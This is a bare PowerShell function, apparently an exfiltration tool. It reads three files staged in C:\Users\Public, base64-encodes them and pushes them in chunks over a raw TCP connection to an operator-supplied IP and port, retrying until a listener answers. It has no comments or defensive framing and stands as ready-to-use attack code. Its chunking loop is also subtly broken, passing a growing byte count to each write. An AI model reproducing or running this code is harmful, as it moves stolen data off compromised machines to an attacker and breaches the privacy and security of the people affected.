function Invoke-Transmission {
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ip,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    $g = New-Object byte[] 1
    $Message11 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\1')))
    $Message12 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\2')))
    $Message13 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\3')))
    $Message21 = New-Object byte[] ([Math]::Ceiling($Message11.Length/1024)*1024)
    $Message22 = New-Object byte[] ([Math]::Ceiling($Message12.Length/1024)*1024)
    $Message23 = New-Object byte[] ([Math]::Ceiling($Message13.Length/1024)*1024)
    [System.Array]::Copy($Message11, $Message21, $Message11.Length)
    [System.Array]::Copy($Message12, $Message22, $Message12.Length)
    [System.Array]::Copy($Message13, $Message23, $Message13.Length)
    $count1 = [text.Encoding]::Ascii.GetBytes($Message21.Length/1024)
    $count2 = [text.Encoding]::Ascii.GetBytes($Message22.Length/1024)
    $count3 = [text.Encoding]::Ascii.GetBytes($Message23.Length/1024)
    $mod1 = [text.Encoding]::Ascii.GetBytes($Message11.Length%1024)
    $mod2 = [text.Encoding]::Ascii.GetBytes($Message12.Length%1024)
    $mod3 = [text.Encoding]::Ascii.GetBytes($Message13.Length%1024)
    do{
        try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
        catch { Sleep 1;Write-Host Connecting... }
    } while (-not $client.Connected)
    $stream = $client.GetStream()
    sleep 1
    $stream.Write($count1,0,$count1.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($count2,0,$count2.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($count3,0,$count3.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($mod1,0,$mod1.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($mod2,0,$mod2.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($mod3,0,$mod3.Length)
    $stream.read($g, 0, $g.Length)
    0..(($Message21.Length/1024)-1) | ForEach-Object {$stream.Write($Message21,$_*1024,($_+1)*1024);$stream.read($g, 0, $g.Length)}
    0..(($Message22.Length/1024)-1) | ForEach-Object {$stream.Write($Message22,$_*1024,($_+1)*1024);$stream.read($g, 0, $g.Length)}
    0..(($Message23.Length/1024)-1) | ForEach-Object {$stream.Write($Message23,$_*1024,($_+1)*1024);$stream.read($g, 0, $g.Length)}
    $client.Close()
    $client.Dispose()
    Write-Host Finished
}